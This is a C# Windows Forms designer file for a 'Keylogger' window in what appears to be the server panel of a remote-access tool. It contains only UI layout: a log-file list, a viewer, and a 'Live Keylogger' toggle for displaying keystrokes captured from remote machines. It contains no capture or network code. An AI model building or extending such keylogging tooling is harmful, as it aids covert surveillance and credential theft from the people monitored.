namespace Pulsar.Server.Forms
{
    partial class FrmKeylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmKeylogger));
            lstLogs = new System.Windows.Forms.ListView();
            hLogs = new System.Windows.Forms.ColumnHeader();
            statusStrip = new System.Windows.Forms.StatusStrip();
            stripLblStatus = new System.Windows.Forms.ToolStripStatusLabel();
            btnGetLogs = new System.Windows.Forms.Button();
            rtbLogViewer = new System.Windows.Forms.RichTextBox();
            button1 = new System.Windows.Forms.Button();
            checkBox1 = new System.Windows.Forms.CheckBox();
            statusStrip.SuspendLayout();
            SuspendLayout();
            // 
            // lstLogs
            // 
            lstLogs.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            lstLogs.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] { hLogs });
            lstLogs.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            lstLogs.FullRowSelect = true;
            lstLogs.GridLines = true;
            lstLogs.Location = new System.Drawing.Point(0, 31);
            lstLogs.Name = "lstLogs";
            lstLogs.Size = new System.Drawing.Size(96, 431);
            lstLogs.TabIndex = 0;
            lstLogs.UseCompatibleStateImageBehavior = false;
            lstLogs.View = System.Windows.Forms.View.Details;
            lstLogs.ItemActivate += lstLogs_ItemActivate;
            // 
            // hLogs
            // 
            hLogs.Text = "Logs";
            hLogs.Width = 149;
            // 
            // statusStrip
            // 
            statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] { stripLblStatus });
            statusStrip.Location = new System.Drawing.Point(0, 460);
            statusStrip.Name = "statusStrip";
            statusStrip.Size = new System.Drawing.Size(862, 22);
            statusStrip.TabIndex = 6;
            statusStrip.Text = "statusStrip1";
            // 
            // stripLblStatus
            // 
            stripLblStatus.Name = "stripLblStatus";
            stripLblStatus.Size = new System.Drawing.Size(77, 17);
            stripLblStatus.Text = "Status: Ready";
            stripLblStatus.Visible = false;
            // 
            // btnGetLogs
            // 
            btnGetLogs.Location = new System.Drawing.Point(0, 5);
            btnGetLogs.Name = "btnGetLogs";
            btnGetLogs.Size = new System.Drawing.Size(96, 23);
            btnGetLogs.TabIndex = 9;
            btnGetLogs.Text = "Get Log Files";
            // 
            // rtbLogViewer
            // 
            rtbLogViewer.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            rtbLogViewer.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            rtbLogViewer.Location = new System.Drawing.Point(102, 32);
            rtbLogViewer.Name = "rtbLogViewer";
            rtbLogViewer.ReadOnly = true;
            rtbLogViewer.Size = new System.Drawing.Size(760, 427);
            rtbLogViewer.TabIndex = 8;
            rtbLogViewer.Text = "";
            // 
            // button1
            // 
            button1.Location = new System.Drawing.Point(102, 6);
            button1.Name = "button1";
            button1.Size = new System.Drawing.Size(58, 23);
            button1.TabIndex = 1;
            button1.Text = "Refresh Selected Log";
            button1.Click += button1_Click;
            // 
            // checkBox1
            // 
            checkBox1.Checked = true;
            checkBox1.CheckState = System.Windows.Forms.CheckState.Checked;
            checkBox1.Location = new System.Drawing.Point(166, 5);
            checkBox1.Name = "checkBox1";
            checkBox1.Size = new System.Drawing.Size(104, 24);
            checkBox1.TabIndex = 0;
            checkBox1.Text = "Live Keylogger";
            checkBox1.CheckedChanged += checkBox1_CheckedChanged_1;
            // 
            // FrmKeylogger
            // 
            AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            ClientSize = new System.Drawing.Size(862, 482);
            Controls.Add(checkBox1);
            Controls.Add(button1);
            Controls.Add(rtbLogViewer);
            Controls.Add(btnGetLogs);
            Controls.Add(statusStrip);
            Controls.Add(lstLogs);
            Font = new System.Drawing.Font("Segoe UI", 8.25F);
            Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            MinimumSize = new System.Drawing.Size(630, 465);
            Name = "FrmKeylogger";
            StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "Keylogger []";
            FormClosing += FrmKeylogger_FormClosing;
            Load += FrmKeylogger_Load;
            statusStrip.ResumeLayout(false);
            statusStrip.PerformLayout();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private System.Windows.Forms.ColumnHeader hLogs;
        private System.Windows.Forms.StatusStrip statusStrip;
        private System.Windows.Forms.RichTextBox rtbLogViewer;
        private System.Windows.Forms.ListView lstLogs;
        private System.Windows.Forms.Button btnGetLogs;
        private System.Windows.Forms.ToolStripStatusLabel stripLblStatus;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.CheckBox checkBox1;
    }
}